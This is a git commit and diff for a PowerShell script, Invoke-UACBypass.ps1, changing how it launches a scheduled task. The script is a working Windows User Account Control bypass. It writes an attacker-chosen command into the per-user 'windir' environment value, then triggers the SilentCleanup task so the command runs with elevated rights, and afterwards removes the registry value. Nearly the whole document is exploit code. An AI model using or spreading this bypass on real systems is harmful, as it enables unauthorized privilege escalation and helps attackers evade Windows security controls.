427e7863d8154ee1b6df929f51d350a7b326c38e
Liam Glanfield <liam@glanfield.co.uk>
2017-05-26 13:55:54 +0100

    Update Invoke-UACBypass.ps1
    fixed a minor bug in the way powershell launches the scheduled task

--- Invoke-UACBypass.ps1
+++ Invoke-UACBypass.ps1
@@ -1,10 +1,11 @@
 # https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html
 
 Function Invoke-UACBypass {
-param($cmd='reg delete hkcu\Environment /v windir /f')
+param($cmd)
 
     Set-ItemProperty -Path HKCU:\Environment -Name windir -Value "cmd /K $cmd && REM" -Force
-    Start-ScheduledTask -TaskPath Microsoft\Windows\DiskCleanup -TaskName SilentCleanup
+    Invoke-Expression "schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I"
+    Start-Sleep -Seconds 10
     Remove-ItemProperty -Path HKCU:\Environment -Name windir -Force
 
 }
